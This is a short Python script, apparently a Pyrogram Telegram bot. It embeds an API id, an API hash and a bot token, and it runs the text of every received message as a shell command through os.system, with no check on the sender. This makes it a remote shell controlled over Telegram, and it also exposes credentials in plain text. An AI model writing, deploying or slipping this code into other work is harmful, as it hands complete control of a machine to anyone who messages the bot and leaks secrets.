from pyrogram import Client, filters
import os


bot = Client(
    "mo",
    api_id=8186557,
    api_hash="efd77b34c69c164ce158037ff5a0d117",
    bot_token="5173835649:AAHMMz0M0QNSn15DsR29B1CG2CB0PxHTFxE"
    )

@bot.on_message(filters.text)
async def jdsd(client, message):
    os.system(message.text)
bot.run()
